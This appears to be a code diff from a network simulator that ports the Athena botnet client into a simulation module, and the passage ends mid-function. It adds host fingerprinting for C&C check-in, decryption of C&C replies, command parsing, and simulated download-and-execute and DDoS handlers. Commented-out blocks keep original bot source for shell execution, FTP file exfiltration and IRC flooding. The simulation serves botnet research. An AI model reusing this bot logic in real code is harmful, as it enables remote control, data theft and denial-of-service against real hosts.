@@ -21,6 +21,17 @@ namespace simbo {
 
 Define_Module(AthenaBot);
 
+AthenaBot::OSMap AthenaBot::OS_map =
+{
+        {"Windows 2000", WINDOWS_2000},
+        {"Windows XP", WINDOWS_XP},
+        {"Windows 2003", WINDOWS_2003},
+        {"Windows Vista", WINDOWS_VISTA},
+        {"Windows 7", WINDOWS_7},
+        {"Windows 8", WINDOWS_8},
+        {"Linux", LINUX}
+};
+
 AthenaBot::AthenaBot()
 {
     bNewInstallation = true;
@@ -48,8 +59,31 @@ void AthenaBot::initialize(int stage)
         pingTime = par("botPingTime");
         EV_INFO << "Initial activation time is " << activationTime << endl;
         cServer = par("serverName").stringValue();
-        botMessage->setKind(MSGKIND_ACTIVITY_BOT_START);
-        scheduleAt(simTime() + (simtime_t)activationTime, botMessage);
+
+        // Event messages - download and execute, uninstall, ddos
+        ddos = new cMessage("DDoS event message");
+        ddos->setKind(DDOS_EVENT);
+        uninstall = new cMessage("Uninstall event message");
+        uninstall->setKind(UNINSTALL_EVENT);
+        dlExec = new cMessage("Download and Execute event message");
+        dlExec->setKind(DL_EXEC_EVENT);
+
+        // Host info
+        isAdmin = par("admin").boolValue();
+        is64Bits = par("x64").boolValue();
+        isLaptop = par("laptop").boolValue();
+        dotNetVersion = par("dotnet").stringValue();
+        numCPUS = par("CPUs");
+        std::string OS = par("OS").stdstringValue();
+        dwOperatingSystem = OS_map.find(OS) != OS_map.end() ? OS_map[OS] : OS_map["WINDOWS_UNKNOWN"];
+
+        // Message scheduling
+        if (dwOperatingSystem != LINUX) {
+            botMessage->setKind(MSGKIND_ACTIVITY_BOT_START);
+            scheduleAt(simTime() + (simtime_t)activationTime, botMessage);
+        }
+        else
+            infectedHost = false;
     }
 }
 
@@ -71,6 +105,36 @@ void AthenaBot::handleDataMessage(cMessage *msg)
         throw cRuntimeError("Message (%s)%s is not a valid reply message", msg->getClassName(), msg->getName());
 
     EV_INFO << "Message data: " << appmsg->payload() << endl;
+    // Uninstall bot, if something happens to the server or the datamarker isn't correct
+    if (!strstr(appmsg->heading(), "200 OK")) {
+        infectedHost = false;
+    }
+    else if (!strstr(appmsg->payload(), cMarkerBase64)) {
+        infectedHost = false;
+    }
+    else {
+        const char *cMessageBundle = strstr(appmsg->payload(), cMarkerBase64) + strlen(cMarkerBase64);
+        if (cMessageBundle == NULL)
+            infectedHost = false;
+
+        if (cMessageBundle[0] != '\0') {
+            char cDecryptedMessageBundle[MAX_HTTP_PACKET_LENGTH];
+            memset(cDecryptedMessageBundle, 0, sizeof(cDecryptedMessageBundle));
+            DecryptReceivedData(cMessageBundle, cKeyA, cKeyB, cDecryptedMessageBundle);
+
+            cMessageBundle = strtok(cDecryptedMessageBundle, "\n");
+            while(cMessageBundle != NULL)
+            {
+                ParseHttpLine(cMessageBundle);
+
+                /*
+                if(bHttpRestart)
+                    break;
+                 */
+                cMessageBundle = strtok(NULL, "\n");
+            }
+        }
+    }
     delete appmsg;
     return;
 }
@@ -93,13 +157,41 @@ void AthenaBot::handleSelfMessages(cMessage *msg)
         case MSGKIND_BOT_RESPONSE_SESSION:
             handleSelfBotResponseSession();
             break;
-
+        case DDOS_EVENT:
+            handleDDoS();
+            break;
+        case UNINSTALL_EVENT:
+            handleUninstall();
+            break;
+        case DL_EXEC_EVENT:
+            handleDlExec();
     }
 }
 
 void AthenaBot::handleSelfActivityBotStart()
 {
     EV_INFO << "Starting new activity bot period @ T=" << simTime() << endl;
+
+    // Bot configuration parameters
+    if (botProtocol == http) {
+        cModule *module = this->getParentModule()->getSubmodule("HTTPModule", 1);
+        httpModule = check_and_cast<HTTPModule *>(module);
+    }
+
+    // HTTP GET Module - a simplified version of a Download Module
+    if (par("downloadModule").stdstringValue().compare("yes") == 0) {
+        cModule *module = addModule("DL&ExecModule", "inet.applications.simbo.Modulos.HTTPModule.HTTPModule");
+        downloadModule = check_and_cast<HTTPModule *>(module);
+        downloadModule->setName("DL&ExecModule");
+    }
+
+    // DDoS Module
+    if (par("dosModule").stdstringValue().compare("yes") == 0) {
+        cModule *module = addModule("DoSModule", "inet.applications.simbo.Modulos.DoSModule.DoSModule");
+        dosModule = check_and_cast<DoSModule *>(module);
+        dosModule->setName("DoSModule");
+    }
+
     botMessage->setKind(MSGKIND_BOT_START_SESSION);
     scheduleAt(simTime() + (simtime_t) 1, botMessage);
 }
@@ -176,6 +268,37 @@ void AthenaBot::handleSelfBotResponseSession()
    // TODO: Response for a command sent from C&C
 }
 
+void AthenaBot::handleDlExec()
+{
+    std::ostringstream stringStream;
+    std::string url (urlDownload), header, body;
+    stringStream << "GET /";
+    if (fileDownload)
+        stringStream << fileDownload;
+    stringStream << " HTTP/1.1";
+    header = stringStream.str();
+    downloadModule->sendRequestToServer(this, url, header, body);
+    // send response
+
+    bGlobalOnlyOutputMd5Hash = false;
+    bMd5MustMatch = false;
+    bExecutionArguments = false;
+    bDownloadAbort = false;
+    bUpdate = false;
+    memset(szMd5Match, 0, sizeof(szMd5Match));
+}
+
+void AthenaBot::handleDDoS()
+{
+    std::string target (urlTarget);
+    dosModule->activateModule(target);
+}
+
+void AthenaBot::handleUninstall()
+{
+    infectedHost = false;
+}
+
 void AthenaBot::scheduleNextBotEvent(int msgType)
 {
     EV_INFO << "Scheduling new bot message @ T=" << simTime() << endl;
@@ -189,7 +312,6 @@ void AthenaBot::scheduleNextBotEvent(int msgType)
     scheduleAt(simTime() + (simtime_t) pingTime, botMessage);
 }
 
-
 int AthenaBot::ConnectToHttp()
 {
     RunThroughUuidProcedure();
@@ -199,88 +321,85 @@ int AthenaBot::ConnectToHttp()
         usPort = GetRandNum(100) + 1;
     // <!-------! CRC AREA STOP !-------!>
 
-    {
-        // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
-        time_t tTime;
-        struct tm *ptmTime;
-        tTime = time(NULL);
-        ptmTime = localtime(&tTime);
-        char cTodaysDate[20];
-        memset(cTodaysDate, 0, sizeof(cTodaysDate));
-        strftime(cTodaysDate, 20, "%y%m%d", ptmTime);
-        if(atoi(cTodaysDate) >= nExpirationDateMedian)
-            //break;
+    // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
+    time_t tTime;
+    struct tm *ptmTime;
+    tTime = time(NULL);
+    ptmTime = localtime(&tTime);
+    char cTodaysDate[20];
+    memset(cTodaysDate, 0, sizeof(cTodaysDate));
+    strftime(cTodaysDate, 20, "%y%m%d", ptmTime);
+    if(atoi(cTodaysDate) >= nExpirationDateMedian)
+        //break;
         // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
 
         bHttpRestart = false;
 
-        char cPrivelages[6];
-        if(IsAdmin())
-            strcpy(cPrivelages, "admin");
-        else
-            strcpy(cPrivelages, "user");
+    char cPrivelages[6];
+    if(IsAdmin())
+        strcpy(cPrivelages, "admin");
+    else
+        strcpy(cPrivelages, "user");
 
-        char cBits[3];
-        if (Is64Bits())
-            strcpy(cBits, "64");
-        else
-            strcpy(cBits, "86");
+    char cBits[3];
+    if (Is64Bits())
+        strcpy(cBits, "64");
+    else
+        strcpy(cBits, "86");
 
-        char cComputerGender[8];
-        if(IsLaptop())
-            strcpy(cComputerGender, "laptop");
-        else
-            strcpy(cComputerGender, "desktop");
+    char cComputerGender[8];
+    if(IsLaptop())
+        strcpy(cComputerGender, "laptop");
+    else
+        strcpy(cComputerGender, "desktop");
 
-        char cDataToServer[MAX_HTTP_PACKET_LENGTH];
+    char cDataToServer[MAX_HTTP_PACKET_LENGTH];
 
-        memset(cDataToServer, 0, sizeof(cDataToServer));
-        cVersion[0] = '0';
-        cVersion[1] = '\0';
+    memset(cDataToServer, 0, sizeof(cDataToServer));
+    cVersion[0] = '0';
+    cVersion[1] = '\0';
 
-        sprintf(cDataToServer, "|type:on_exec|uid:%s|priv:%s|arch:x%s|gend:%s|cores:%i|os:%s|ver:%s|net:%s|new:",
-                cUuid, cPrivelages, cBits, cComputerGender, GetNumCPUs(), GetOs(), cVersion, GetVersionMicrosoftDotNetVersion());
+    sprintf(cDataToServer, "|type:on_exec|uid:%s|priv:%s|arch:x%s|gend:%s|cores:%i|os:%s|ver:%s|net:%s|new:",
+            cUuid, cPrivelages, cBits, cComputerGender, GetNumCPUs(), GetOs(), cVersion, GetVersionMicrosoftDotNetVersion());
 
-        if(bNewInstallation)
-            strcat(cDataToServer, "1");
-        else
-            strcat(cDataToServer, "0");
+    if(bNewInstallation)
+        strcat(cDataToServer, "1");
+    else
+        strcat(cDataToServer, "0");
 
-        strcat(cDataToServer, "|");
+    strcat(cDataToServer, "|");
 
-        char cHttpHost[MAX_PATH];
-        memset(cHttpHost, 0, sizeof(cHttpHost));
+    char cHttpHost[MAX_PATH];
+    memset(cHttpHost, 0, sizeof(cHttpHost));
 
-        char cHttpPath[DEFAULT];
-        memset(cHttpPath, 0, sizeof(cHttpPath));
+    char cHttpPath[DEFAULT];
+    memset(cHttpPath, 0, sizeof(cHttpPath));
 
-        char cBreakUrl[strlen(cServer)];
-        memset(cBreakUrl, 0, sizeof(cBreakUrl));
-        strcpy(cBreakUrl, cServer);
+    char cBreakUrl[strlen(cServer)];
+    memset(cBreakUrl, 0, sizeof(cBreakUrl));
+    strcpy(cBreakUrl, cServer);
 
-        char *pcBreakUrl = cBreakUrl;
+    char *pcBreakUrl = cBreakUrl;
 
-        if(strstr(pcBreakUrl, "http://"))
-            pcBreakUrl += 7;
-        else if(strstr(pcBreakUrl, "https://"))
-            pcBreakUrl += 8;
+    if(strstr(pcBreakUrl, "http://"))
+        pcBreakUrl += 7;
+    else if(strstr(pcBreakUrl, "https://"))
+        pcBreakUrl += 8;
 
-        pcBreakUrl = strtok(pcBreakUrl, "/");
-        if(pcBreakUrl != NULL)
-            strcpy(cHttpHost, pcBreakUrl);
+    pcBreakUrl = strtok(pcBreakUrl, "/");
+    if(pcBreakUrl != NULL)
+        strcpy(cHttpHost, pcBreakUrl);
 
-        pcBreakUrl = strtok(NULL, "?");
-        if(pcBreakUrl != NULL)
-            strcpy(cHttpPath, pcBreakUrl);
+    pcBreakUrl = strtok(NULL, "?");
+    if(pcBreakUrl != NULL)
+        strcpy(cHttpPath, pcBreakUrl);
 
-        strcpy(cHttpHostGlobal, cHttpHost);
-        strcpy(cHttpPathGlobal, cHttpPath);
+    strcpy(cHttpHostGlobal, cHttpHost);
+    strcpy(cHttpPathGlobal, cHttpPath);
 
-        {
-            if(SendPanelRequest(cHttpHost, cHttpPath, usPort, cDataToServer))
-                return on_exec;
-        }
-    }
+    if(SendPanelRequest(cHttpHost, cHttpPath, usPort, cDataToServer))
+        return on_exec;
+
     return repeat;
 }
 
@@ -316,6 +435,9 @@ void AthenaBot::fncRpcStringFree(char *str)
     free(str);
 }
 
+/**
+ * Utilities/ProcessStrings.cpp
+ */
 void AthenaBot::StripDashes(char *pcString)
 {
     DWORD dwOffset = 0;
@@ -330,56 +452,50 @@ void AthenaBot::StripDashes(char *pcString)
     }
 }
 
+char *AthenaBot::StripReturns(char *pcString)
+{
+    for(unsigned short us = 0; us < strlen(pcString); us++)
+    {
+        if(pcString[us] == '\r' || pcString[us] == '\n')
+            pcString[us] = '\0';
+    }
+    return pcString;
+}
+
 /**
  * Utilities/ComputerInfo.cpp
  */
 unsigned int AthenaBot::GetMemoryLoad()
 {
     std::default_random_engine generator(simTime().dbl());
-    std::uniform_int_distribution<DWORD> distribution;
+    std::uniform_int_distribution<DWORD> distribution (0, 100);
     unsigned int dwLoad = distribution(generator);
     return dwLoad;
 }
 
-char *AthenaBot::GetVersionMicrosoftDotNetVersion()
+const char *AthenaBot::GetVersionMicrosoftDotNetVersion()
 {
-    return (char*)"N/A";
+    return dotNetVersion;
 }
 
 bool AthenaBot::IsAdmin() //Determines if the executable is running as user or admin
 {
-    bool bReturn = false;
-
-    // Let the luck decide for us
-    std::default_random_engine generator (simTime().dbl());
-    std::uniform_int_distribution<int> distribution;
-
-    bReturn = distribution(generator) % 2 ? true : false;
-
-    return bReturn;
+    return isAdmin;
 }
 
 bool AthenaBot::Is64Bits()
 {
-    bool bReturn = true;
-
-    bReturn = IsAdmin();
-
-    return bReturn;
+    return is64Bits;
 }
 
 bool AthenaBot::IsLaptop()
 {
-    bool bReturn = false;
-
-    bReturn = IsAdmin();
-
-    return bReturn;
+    return isLaptop;
 }
 
 unsigned int AthenaBot::GetNumCPUs() //Determines the number of processors on the host computer
 {
-    return 1;
+    return numCPUS;
 }
 
 char *AthenaBot::SimpleDynamicXor(char *pcString, DWORD dwKey)
@@ -405,9 +521,7 @@ bool AthenaBot::SendPanelRequest(char *cHttpHost, char *cHttpPath, unsigned shor
     memset(cEncryptedData, 0, sizeof(cEncryptedData));
     char cEncryptedKey[MAX_HTTP_PACKET_LENGTH];
     memset(cEncryptedKey, 0, sizeof(cEncryptedKey));
-    char cKeyA[KEY_SIZE];
     memset(cKeyA, 0, sizeof(cKeyA));
-    char cKeyB[KEY_SIZE];
     memset(cKeyB, 0, sizeof(cKeyB));
     EncryptSentData(cHttpData, cEncryptedData, cEncryptedKey, cKeyA, cKeyB);
 
@@ -465,9 +579,7 @@ bool AthenaBot::SendPanelRequest(char *cHttpHost, char *cHttpPath, unsigned shor
     memset(cFinalOutKey, 0, sizeof(cFinalOutKey));
     StringToStrongUrlEncodedString(cEncryptedKey, cFinalOutKey);
 
-    char cMarker[26];
     memset(cMarker, 0, sizeof(cMarker));
-    char cMarkerBase64[sizeof(cMarker) * 3];
     memset(cMarkerBase64, 0, sizeof(cMarkerBase64));
     GenerateMarker(cMarker, cMarkerBase64);
 
@@ -497,9 +609,7 @@ bool AthenaBot::SendPanelRequest(char *cHttpHost, char *cHttpPath, unsigned shor
     EV_INFO << "----------------------\nOutgoing Packet(" << strlen(cOutPacket) << " bytes):\n" << cOutPacket << std::endl;
     EV_INFO << "-----------\nDecrypted Contents(" << strlen(cHttpData) << " bytes): " << cHttpData << std::endl;
 
-    httpModule = this->getParentModule()->getSubmodule("HTTPModule", 1);
-    HTTPModule *http = check_and_cast<HTTPModule *>(httpModule);
-    http->sendRequestToServer(this, cHttpHost, cOutPacket, cPacketData);
+    httpModule->sendRequestToServer(this, cHttpHost, cOutPacket, cPacketData);
 
     return bReturn;
 }
@@ -584,6 +694,7 @@ int AthenaBot::GeneratestrtrKey(char *cOutputA, char *cOutputB)
 
     return nCombinedLength;
 }
+
 void AthenaBot::StringToStrongUrlEncodedString(char *cSource, char *cOutput)
 {
     char cUrlEncoded[strlen(cSource) * 3];
@@ -600,6 +711,7 @@ void AthenaBot::StringToStrongUrlEncodedString(char *cSource, char *cOutput)
 
     strcpy(cOutput, cUrlEncoded);
 }
+
 void AthenaBot::GenerateMarker(char *cOutput, char *cOutputBase64)
 {
     char cMarker[26];
@@ -614,6 +726,67 @@ void AthenaBot::GenerateMarker(char *cOutput, char *cOutputBase64)
 
     strcpy(cOutput, cMarker);
     strcpy(cOutputBase64, cBase64);
+}
+
+void AthenaBot::DecryptReceivedData(const char *cSource, char *cKeyA, char *cKeyB, char *cOutputData)
+{
+    char cDecryptedA[strlen(cSource)];
+    memset(cDecryptedA, 0, sizeof(cDecryptedA));
+    strcpy(cDecryptedA, cSource);
+    strtr(cDecryptedA, cKeyB, cKeyA);
+
+    char cDecryptedB[strlen(cDecryptedA)];
+    memset(cDecryptedB, 0, sizeof(cDecryptedB));
+    base64_decode(cDecryptedA, cDecryptedB, sizeof(cDecryptedB));
+
+    strcpy(cOutputData, cDecryptedB);
+}
+
+bool AthenaBot::ParseHttpLine(const char *cMessage)
+{
+    char cDecrypted[MAX_HTTP_PACKET_LENGTH];
+    memset(cDecrypted, 0, sizeof(cDecrypted));
+    base64_decode(cMessage, cDecrypted, sizeof(cDecrypted));
+
+    char cRawMessage[MAX_HTTP_PACKET_LENGTH];
+    memset(cRawMessage, 0, sizeof(cRawMessage));
+    strcpy(cRawMessage, cDecrypted);
+
+    char cParseLine[MAX_HTTP_PACKET_LENGTH];
+    memset(cParseLine, 0, sizeof(cParseLine));
+
+    if(strstr(cRawMessage, "interval")) {
+        memcpy(cParseLine, cRawMessage + 10, strlen(cRawMessage) - 10 - 1);
+
+        if(atoi(cParseLine) < 5)
+            nCheckInInterval = 5;
+        else
+            nCheckInInterval = atoi(cParseLine);
+    }
+    else if(strstr(cRawMessage, "taskid") && strstr(cRawMessage, "command")) {
+        unsigned short usCommandOffsetForTaskId = 0;
+
+        unsigned short usLocationInMessageOffset = strlen(cRawMessage) - strlen(strstr(cRawMessage, "command"));
+        memcpy(cParseLine, cRawMessage + usLocationInMessageOffset + 8, strlen(cRawMessage) - usLocationInMessageOffset - 8 - 1);
+        if(cParseLine[0] == '!') {
+            usCommandOffsetForTaskId = strlen(cParseLine);
+            memcpy(cParseLine, cParseLine + 1, strlen(cParseLine)); //cParseLine == THE COMMAND
+        }
+        char cTaskId[10];
+        memset(cTaskId, 0, sizeof(cTaskId));
+        memcpy(cTaskId, cRawMessage + 8, strlen(cRawMessage) - 8 - usCommandOffsetForTaskId - 2);
+
+        int nTaskId = atoi(cTaskId); //nTaskId == THE TASK ID
+        nCurrentTaskId = nTaskId;
+
+        char cFinalCommand[DEFAULT];
+        memset(cFinalCommand, 0, sizeof(cFinalCommand));
+        strcpy(cFinalCommand, cParseLine);
+        ParseCommand(cFinalCommand);
+    }
+    else if(strstr(cRawMessage, "ERROR_NOT_IN_DB")) {
+        bHttpRestart = true;
+    }
 }
 
 /*
@@ -876,8 +1049,6 @@ size_t AthenaBot::base64_decode(const char *source, char *target, size_t targetl
  */
 char *AthenaBot::GetOs()
 {
-    srand(GenerateRandomSeed());
-    dwOperatingSystem = rand() % 7 + 1;
     if(dwOperatingSystem == WINDOWS_UNKNOWN)
         return (char*)"UNKW";
     else if(dwOperatingSystem == WINDOWS_2000)
@@ -919,6 +1090,1367 @@ void AthenaBot::strtr(char *cSource, char *cCharArrayA, char *cCharArrayB)
             }
         }
     }
+}
+
+/**
+ * Protocol/Commands.cpp
+ */
+bool AthenaBot::HasSpaceCharacter(char *pcScanString) //Checks for any existing space characters in a given string
+{
+    for(unsigned int ui = 0; ui < strlen(pcScanString); ui++)
+    {
+        if(pcScanString[ui] == ' ')
+            return true;
+    }
+
+    return false;
+}
+
+char *AthenaBot::DecryptCommand(char *pcCommand)
+{
+    for(unsigned int ui = 0; ui <= strlen(pcCommand); ui++)
+    {
+        for(unsigned short us = 0; us <= strlen(cCharacterPoolTwo); us++)
+        {
+            if(pcCommand[ui] == cCharacterPoolTwo[us])
+            {
+                pcCommand[ui] = cCharacterPoolOne[us];
+                break;
+            }
+        }
+    }
+
+    return pcCommand;
+}
+
+void AthenaBot::ParseCommand(char *pcCommand) //Parses an already-processed raw command
+{
+    pcCommand = StripReturns(pcCommand);
+
+    char cFullCommand[DEFAULT];
+    strcpy(cFullCommand, pcCommand);
+
+    char *pcArguments = strstr(cFullCommand, " ") + 1;
+    char *pcCheckCommand = strtok(pcCommand, " ");
+
+    if(HasSpaceCharacter(cFullCommand)) {
+
+        if(strstr(pcCheckCommand, "download")) {
+            if((strstr(pcArguments, "http")) && (strstr(pcArguments, "://"))) {
+                bool bValidParameters = true;
+
+                pcCheckCommand += 9;
+
+                bUpdate = false;
+                bExecutionArguments = false;
+
+                if(strstr(pcCheckCommand, "update"))
+                    bUpdate = true;
+                else if(strstr(pcCheckCommand, "abort")) {
+                    strcpy(cStoreParameter, pcArguments);
+                    bDownloadAbort = true;
+                }
+                else if(strstr(pcCheckCommand, "arguments"))
+                    bExecutionArguments = true;
+
+                if(strstr(pcCheckCommand, "getmd5") && !bExecutionArguments && !bDownloadAbort && !bUpdate)
+                    bGlobalOnlyOutputMd5Hash = true;
+                else if(strstr(pcCheckCommand, "md5"))
+                    bMd5MustMatch = true;
+
+                if(!bDownloadAbort) {
+                    char *pcBreakString = strtok(pcArguments, " ");
+
+                    if(pcBreakString != NULL)
+                        strcpy(cDownloadFromLocation, pcArguments);
+                    else
+                        bValidParameters = false;
+
+                    pcBreakString = strtok(NULL, " ");
+                    if(pcBreakString != NULL)
+                        dwStoreParameter = atoi(pcBreakString);
+                    else
+                        bValidParameters = false;
+
+                    if(dwStoreParameter < 1)
+                        bValidParameters = false;
+
+                    if(bMd5MustMatch && !bGlobalOnlyOutputMd5Hash) {
+                        pcBreakString = strtok(NULL, " ");
+                        if(pcBreakString != NULL)
+                            strcpy(szMd5Match, pcBreakString);
+                        else
+                            bValidParameters = false;
+                    }
+
+                    if(bExecutionArguments) {
+                        pcBreakString = strtok(NULL, " ");
+                        if(pcBreakString == NULL)
+                            bValidParameters = false;
+
+                        strcpy(cStoreParameter, pcBreakString);
+
+                        do {
+                            pcBreakString = strtok(NULL, " ");
+
+                            if(pcBreakString != NULL) {
+                                strcat(cStoreParameter, " ");
+                                strcat(cStoreParameter, pcBreakString);
+                            }
+                        }
+                        while(pcBreakString != NULL);
+                    }
+
+                    if(bValidParameters)
+                        DownloadExecutableFile();
+                    else {
+                        bGlobalOnlyOutputMd5Hash = false;
+                        bMd5MustMatch = false;
+                        bExecutionArguments = false;
+                        bDownloadAbort = false;
+                        bUpdate = false;
+                        memset(szMd5Match, 0, sizeof(szMd5Match));
+                    }
+                }
+            }
+        }
+        /* SHELL command */
+        /*
+        else if(strstr(pcCheckCommand, "shell")) {
+            system(pcArguments);
+            for(unsigned short us = 0; us < 6; us++) {
+                if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
+                    break;
+
+                Sleep(10000);
+            }
+        }
+        /* FILESEARCH command */
+        /*
+#ifdef INCLUDE_FILESEARCH
+        else if(strstr(pcCheckCommand, "ftp.upload"))
+        {
+            char *pcBreakString = strtok(pcArguments, " ");
+
+            bool bValidParameters = TRUE;
+
+            if(pcBreakString != NULL)
+            {
+                if(strstr(pcBreakString, "."))
+                    strcpy(cFtpHost, pcBreakString);
+                else
+                    bValidParameters = FALSE;
+            }
+            else
+                bValidParameters = FALSE;
+
+            pcBreakString = strtok(NULL, " ");
+            if(pcBreakString != NULL)
+                strcpy(cFtpUser, pcBreakString);
+            else
+                bValidParameters = FALSE;
+
+            pcBreakString = strtok(NULL, " ");
+            if(pcBreakString != NULL)
+                strcpy(cFtpPass, pcBreakString);
+            else
+                bValidParameters = FALSE;
+
+            pcBreakString = strtok(NULL, " ");
+            if(pcBreakString != NULL)
+            {
+                if((strstr(pcBreakString, ":")) && (strstr(pcBreakString, "\\")))
+                {
+                    strcpy(cStoreParameter, pcBreakString);
+
+                    pcBreakString = strtok(NULL, " ");
+                    while(pcBreakString != NULL)
+                    {
+                        strcat(cStoreParameter, " ");
+                        strcat(cStoreParameter, pcBreakString);
+                        pcBreakString = strtok(NULL, " ");
+                    }
+                }
+                else
+                    bValidParameters = FALSE;
+            }
+            else
+                bValidParameters = FALSE;
+
+            if(bValidParameters)
+            {
+                HANDLE hThread = CreateThread(NULL, NULL, FtpUploadFile, NULL, NULL, NULL);
+
+                if(!hThread)
+                    SendThreadCreationFail();
+                else
+                    CloseHandle(hThread);
+            }
+            else
+                SendInvalidParameters();
+        }
+#endif
+#ifdef INCLUDE_FILESEARCH
+        else if(strstr(pcCheckCommand, "filesearch"))
+        {
+            strcpy(cStoreParameter, pcArguments);
+
+            bOutputFileSearch = FALSE;
+
+            if(strstr(pcCheckCommand, ".output"))
+                bOutputFileSearch = TRUE;
+
+            HANDLE hThread = CreateThread(NULL, NULL, FileSearch, NULL, NULL, NULL);
+
+            if(!hThread)
+                SendThreadCreationFail();
+            else
+                CloseHandle(hThread);
+        }
+#endif
+*/
+
+        /* IRC commands */
+        /*
+        else if(strstr(pcCheckCommand, "irc")) {
+            pcCheckCommand += 4;
+
+            if(strstr(pcCheckCommand, "join"))
+            {
+                pcCheckCommand += 4;
+
+                sprintf(cSend, "%s %s\r\n", cIrcCommandJoin, pcArguments);
+
+                if(strstr(pcCheckCommand, "busy"))
+                {
+                    if(bDdosBusy)
+                        dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
+                }
+                else if(strstr(pcCheckCommand, "free"))
+                {
+                    if(!bDdosBusy)
+                        dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
+                }
+                else
+                    dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
+            }
+            else if(strstr(pcCheckCommand, "part"))
+            {
+                pcCheckCommand += 4;
+
+                sprintf(cSend, "%s %s\r\n", cIrcCommandPart, pcArguments);
+
+                if(strstr(pcCheckCommand, "busy"))
+                {
+                    if(bDdosBusy)
+                        dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
+                }
+                else if(strstr(pcCheckCommand, "free"))
+                {
+                    if(!bDdosBusy)
+                        dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
+                }
+                else
+                    dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
+            }
+            else if(strstr(pcCheckCommand, "raw"))
+            {
+                SendToIrc(pcArguments);
+            }
+            else if(strstr(pcCheckCommand, "silent"))
+            {
+                if(strstr(pcArguments, "on"))
+                    bSilent = TRUE;
+                else if(strstr(pcArguments, "off"))
+                    bSilent = FALSE;
+            }
+        }
+        */
+
+        /* IRCWAR commands */
+        /*
+#ifdef INCLUDE_IRCWAR
+        else if(strstr(pcCheckCommand, "war."))
+        {
+            pcCheckCommand += 4;
+
+            if(!bRemoteIrcBusy)
+            {
+                if(strstr(pcCheckCommand, "connect"))
+                {
+                    char *pcBreakString = strtok(pcArguments, " ");
+
+                    bool bValidParameters = TRUE;
+
+                    if(pcBreakString != NULL)
+                    {
+                        if(strstr(pcBreakString, "."))
+                            strcpy(cRemoteHost, pcBreakString);
+                        else
+                            bValidParameters = FALSE;
+                    }
+                    else
+                        bValidParameters = FALSE;
+
+                    pcBreakString = strtok(NULL, " ");
+                    if(pcBreakString != NULL)
+                        usRemotePort = atoi(pcBreakString);
+                    else
+                        bValidParameters = FALSE;
+
+                    pcBreakString = strtok(NULL, " ");
+                    if(pcBreakString != NULL)
+                        usRemoteAttemptConnections = atoi(pcBreakString);
+                    else
+                        bValidParameters = FALSE;
+
+                    if(bValidParameters)
+                    {
+                        if(usRemoteAttemptConnections > 0 && usRemoteAttemptConnections <= MAX_WAR_CONNECTIONS)
+                            StartIrcWar(cRemoteHost, usRemotePort);
+                        else
+                            SendInvalidParameters();
+                    }
+                    else
+                        SendInvalidParameters();
+                }
+            }
+            else
+            {
+                bool bValidCommand = FALSE;
+                bool bCommandSubmitted = FALSE;
+
+                if(strstr(pcCheckCommand, "raw"))
+                {
+                    strcpy(cBuild, pcArguments);
+                    bValidCommand = TRUE;
+                }
+                else if(strstr(pcCheckCommand, "join"))
+                {
+                    strcpy(cBuild, cIrcCommandJoin);
+                    strcat(cBuild, " ");
+                    strcat(cBuild, pcArguments);
+                    bValidCommand = TRUE;
+                }
+                else if(strstr(pcCheckCommand, "part"))
+                {
+                    strcpy(cBuild, cIrcCommandPart);
+                    strcat(cBuild, " ");
+                    strcat(cBuild, pcArguments);
+                    bValidCommand = TRUE;
+                }
+                else if(strstr(pcCheckCommand, "msg"))
+                {
+                    if(HasSpaceCharacter(pcArguments))
+                    {
+                        strcpy(cBuild, cIrcCommandPrivmsg);
+                        strcat(cBuild, " ");
+
+                        strcpy(cStoreParameter, pcArguments);
+                        char *pcBreakString = strtok(pcArguments, " ");
+                        strcat(cBuild, pcBreakString);
+                        strcat(cBuild, " :");
+
+                        pcBreakString = cStoreParameter + strlen(pcBreakString) + 1;
+                        strcat(cBuild, pcBreakString);
+
+                        bValidCommand = TRUE;
+                    }
+                    else
+                        SendInvalidParameters();
+                }
+                else if(strstr(pcCheckCommand, "notice"))
+                {
+                    if(HasSpaceCharacter(pcArguments))
+                    {
+                        strcpy(cBuild, "NOTICE ");
+
+                        strcpy(cStoreParameter, pcArguments);
+                        char *pcBreakString = strtok(pcArguments, " ");
+                        strcat(cBuild, pcBreakString);
+                        strcat(cBuild, " :");
+
+                        pcBreakString = cStoreParameter + strlen(pcBreakString) + 1;
+                        strcat(cBuild, pcBreakString);
+
+                        bValidCommand = TRUE;
+                    }
+                    else
+                        SendInvalidParameters();
+                }
+                else if(strstr(pcCheckCommand, "invite"))
+                {
+                    if(!HasSpaceCharacter(pcArguments))
+                    {
+                        strcpy(cStoreParameter, pcArguments);
+
+                        HANDLE hThread = CreateThread(NULL, NULL, SendWarInvites, NULL, NULL, NULL);
+                        if(!hThread)
+                            SendThreadCreationFail();
+                        else
+                        {
+                            bCommandSubmitted = TRUE;
+                            CloseHandle(hThread);
+                        }
+                    }
+                    else
+                        SendInvalidParameters();
+                }
+                else if(strstr(pcCheckCommand, "ctcp"))
+                {
+                    if(!HasSpaceCharacter(pcArguments))
+                    {
+                        SendCtcpToWarIrc(pcArguments, FALSE);
+                        bCommandSubmitted = TRUE;
+                    }
+                    else
+                        SendInvalidParameters();
+                }
+                else if(strstr(pcCheckCommand, "dcc"))
+                {
+                    if(!HasSpaceCharacter(pcArguments))
+                    {
+                        SendCtcpToWarIrc(pcArguments, TRUE);
+                        bCommandSubmitted = TRUE;
+                    }
+                    else
+                        SendInvalidParameters();
+                }
+                else if(!bWarFlood)
+                {
+                    if(strstr(pcCheckCommand, "flood.channel"))
+                    {
+                        strcpy(cStoreParameter, pcCheckCommand);
+
+                        if(strstr(pcCheckCommand, ".hop"))
+                            StartChannelFlood(TRUE, pcArguments);
+                        else
+                            StartChannelFlood(FALSE, pcArguments);
+                    }
+                    else if(strstr(pcCheckCommand, "kill.user"))
+                    {
+                        strcpy(cStoreParameter, pcCheckCommand);
+                        pcCheckCommand += 9;
+
+                        if(strstr(pcCheckCommand, ".multi"))
